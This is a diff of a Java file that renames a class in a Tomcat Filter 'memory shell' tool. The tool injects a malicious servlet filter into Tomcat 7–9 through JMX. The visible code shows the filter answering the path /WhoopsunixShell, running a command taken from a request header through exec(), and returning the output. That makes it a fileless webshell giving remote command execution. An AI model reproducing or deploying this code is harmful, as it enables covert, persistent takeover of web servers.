@@ -12,15 +12,15 @@ import java.util.Set;
 
 /**
  * @author Whoopsunix
- * JMX 获取上下文注入 Tomcat Filter 型内存马
+ * JMX 获取 StandardContext 注入 Tomcat Filter 型内存马
  * Tomcat 7 8 9
  */
-public class TFMSJMX implements Filter {
+public class TomcatFilterJMXMS implements Filter {
 
     final private static String NAME = "Whoopsunix";
     final private static String pattern = "/WhoopsunixShell";
 
-    public TFMSJMX() {
+    public TomcatFilterJMXMS() {
 
     }
 
@@ -49,7 +49,7 @@ public class TFMSJMX implements Filter {
                 if (filterDef != null) {
                     break;
                 }
-                TFMSJMX filterMemShell = new TFMSJMX();
+                TomcatFilterJMXMS filterMemShell = new TomcatFilterJMXMS();
 
                 try {
                     // tomcat 7
@@ -122,7 +122,7 @@ public class TFMSJMX implements Filter {
             }
             String result = exec(header);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TFMSJMX injected");
+            printWriter.println("TomcatFilterJMXMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
